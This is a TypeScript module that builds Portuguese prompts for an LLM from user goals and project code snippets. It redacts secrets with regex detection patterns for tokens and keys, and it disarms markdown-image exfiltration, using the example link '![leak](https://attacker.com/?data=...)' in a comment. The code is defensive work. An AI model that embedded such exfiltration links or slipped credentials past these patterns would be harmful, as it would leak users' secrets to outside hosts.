import type { SelectedElement, PromptTemplate } from '@/types/prompt';
import type { SupportedFramework } from '@/types/project';
import { isSensitivePath } from '@/services/fileSystem';

/**
 * Redacts known sensitive patterns (GitHub PATs, API keys, Bearer tokens, private keys)
 * from code snippets and prompt text to prevent accidental leaks to LLMs.
 */
export function redactSecrets(text: string): string {
  if (!text) return '';
  return text
    // GitHub PAT classic (ghp_...)
    .replace(/ghp_[a-zA-Z0-9]{36}/g, 'ghp_REDACTED_PAT')
    // GitHub Fine-grained PAT (github_pat_...)
    .replace(/github_pat_[a-zA-Z0-9_]+/g, 'github_pat_REDACTED_TOKEN')
    // GitHub OAuth tokens (gho_...)
    .replace(/gho_[a-zA-Z0-9]{36}/g, 'gho_REDACTED_OAUTH')
    // GitHub App User / Server / Refresh tokens
    .replace(/ghu_[a-zA-Z0-9]{36}/g, 'ghu_REDACTED')
    .replace(/ghs_[a-zA-Z0-9]{36}/g, 'ghs_REDACTED')
    .replace(/ghr_[a-zA-Z0-9]{36}/g, 'ghr_REDACTED')
    // Google Gemini / Firebase API key (AIzaSy...)
    .replace(/AIzaSy[0-9A-Za-z_-]{30,40}/g, 'AIzaSy_REDACTED_KEY')
    // OpenAI / Anthropic API keys (sk-...)
    .replace(/sk-(?:proj-|live-|ant-)?[a-zA-Z0-9_-]{20,}/g, 'sk_REDACTED_KEY')
    // AWS Access Key ID (AKIA...)
    .replace(/AKIA[0-9A-Z]{16}/g, 'AKIA_REDACTED_AWS')
    // Bearer authentication tokens
    .replace(/Bearer\s+[a-zA-Z0-9_\-\.]{15,}/gi, 'Bearer REDACTED_TOKEN')
    // Private cryptographic keys
    .replace(/-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]*?-----END [A-Z ]+PRIVATE KEY-----/g, '/* [REDACTED_PRIVATE_KEY] */')
    // Generic API keys/secrets assignments in code: apiKey = "...", secret: "..."
    .replace(
      /((?:api[_-]?key|client[_-]?secret|auth[_-]?token|secret[_-]?key|access[_-]?token|private[_-]?key)\s*[:=]\s*['"])([^'"]{6,})(['"])/gi,
      '$1[REDACTED_SECRET]$3'
    );
}

/**
 * Calculates the required number of backticks for markdown fencing to prevent
 * code snippets with backticks from breaking the outer markdown structure.
 */
export function createSafeMarkdownFence(snippet: string): string {
  const backtickMatches = snippet.match(/`+/g) || [];
  const maxBackticks = backtickMatches.reduce((max, m) => Math.max(max, m.length), 0);
  return '`'.repeat(Math.max(3, maxBackticks + 1));
}

/**
 * Sanitizes user goal input against secrets and markdown image exfiltration vectors.
 */
export function sanitizeUserGoal(goal: string): string {
  if (!goal) return '';
  let cleaned = redactSecrets(goal.trim());
  // Disarm markdown image exfiltration (e.g. ![leak](https://attacker.com/?data=...))
  cleaned = cleaned.replace(/!\[(.*?)\]\((https?:\/\/[^\s)]+)\)/gi, '[Imagem externa desarmada: $1]');
  return cleaned;
}

export function generatePromptText(
  template: PromptTemplate,
  userGoal: string,
  selectedElements: SelectedElement[],
  framework: SupportedFramework = 'react'
): string {
  const lines: string[] = [];

  // Header & Role
  lines.push(`# Contexto para IA: Tarefa no Projeto Frontend`);
  lines.push(``);
  lines.push(`> **Framework:** ${framework.toUpperCase()}`);
  lines.push(`> **Tipo de Solicitação:** ${template.name}`);
  lines.push(``);
  lines.push(`## Papel`);
  lines.push(template.systemRole);
  lines.push(``);

  // Goal
  lines.push(`## Objetivo Solicitado`);
  const sanitizedGoal = sanitizeUserGoal(userGoal);
  lines.push(sanitizedGoal || template.defaultGoal);
  lines.push(``);

  // Selected Elements
  lines.push(`## Elementos e Fluxos Selecionados no Projeto`);
  if (selectedElements.length === 0) {
    lines.push(`*(Nenhum elemento específico selecionado — use o contexto geral do projeto)*`);
  } else {
    lines.push(`Foram selecionados **${selectedElements.length} elemento(s)** diretamente no mapa de fluxo da aplicação:`);
    lines.push(``);

    selectedElements.forEach((el, index) => {
      lines.push(`### ${index + 1}. [${el.nodeType.toUpperCase()}] ${el.label}`);
      if (el.filePath) {
        lines.push(`- **Arquivo:** \`${el.filePath}\``);
        if (isSensitivePath(el.filePath)) {
          lines.push(`> ⚠️ **Aviso de Segurança:** O arquivo selecionado (\`${el.filePath}\`) pode conter credenciais. Verifique os dados antes de submeter.`);
        }
      }
      if (el.codeSnippet) {
        const lang = detectSnippetLanguage(el.filePath);
        const fence = createSafeMarkdownFence(el.codeSnippet);
        const safeSnippet = redactSecrets(el.codeSnippet.trim());
        lines.push(`- **Código / Trecho Relevante:**`);
        lines.push(`${fence}${lang}`);
        lines.push(safeSnippet);
        lines.push(fence);
      }
      lines.push(``);
    });
  }

  // Framework Best Practices
  lines.push(`## Boas Práticas da Arquitetura (${framework.toUpperCase()})`);
  lines.push(getFrameworkGuidance(framework));
  lines.push(``);

  // Security Directives
  lines.push(`## Diretrizes de Segurança e Boas Práticas`);
  lines.push(`- **Sanitização:** Garanta que dados dinâmicos sejam sempre validados e escapados contra ataques XSS e injeção.`);
  lines.push(`- **Segredos:** Nunca insira credenciais, chaves de API ou senhas diretamente no código cliente.`);
  lines.push(`- **Robustez:** Trate estados de carregamento e erros de rede de forma graciosa na interface.`);
  lines.push(``);

  // Instructions
  lines.push(`## Instruções Específicas`);
  lines.push(template.promptInstruction);
  lines.push(``);
  lines.push(`## Formato de Saída Esperado`);
  lines.push(`1. Resumo da abordagem proposta e arquivos impactados`);
  lines.push(`2. Arquivos alterados/criados com código TypeScript completo e sem abreviações`);
  lines.push(`3. Explicação dos pontos críticos, como testar e validações de regressão`);

  return lines.join('\n');
}

function getFrameworkGuidance(framework: SupportedFramework): string {
  switch (framework) {
    case 'nextjs':
      return '- **Diretrizes Next.js:** Respeite convenções do App Router / Pages Router. Mantenha componentes Client (`"use client"`) apenas onde houver interatividade ou hooks de browser. Use Server Components para busca de dados direta quando aplicável.';
    case 'vue':
      return '- **Diretrizes Vue 3:** Use a sintaxe Composition API com `<script setup lang="ts">`. Utilize Pinia para gerenciamento de estado global e reatividade com `ref` / `computed`.';
    case 'angular':
      return '- **Diretrizes Angular:** Utilize Standalone Components, injeção de dependência via `inject()`, e Signals para estado reativo moderno quando compatível.';
    default:
      return '- **Diretrizes React:** Use TypeScript estrito, hooks customizados para regras de negócio e reutilize stores Zustand/Redux existentes sem duplicar estado.';
  }
}

export function detectSnippetLanguage(filePath?: string): string {
  if (!filePath) return 'tsx';
  const ext = filePath.split('.').pop()?.toLowerCase();
  switch (ext) {
    case 'vue':
      return 'vue';
    case 'ts':
      return 'ts';
    case 'tsx':
      return 'tsx';
    case 'js':
    case 'mjs':
    case 'cjs':
      return 'js';
    case 'jsx':
      return 'jsx';
    case 'html':
      return 'html';
    case 'css':
    case 'scss':
      return 'css';
    case 'json':
      return 'json';
    default:
      return 'tsx';
  }
}

export function estimateTokens(text: string): number {
  // Good rule of thumb for English/Portuguese code & text: ~4 characters per token
  return Math.ceil(text.length / 4);
}
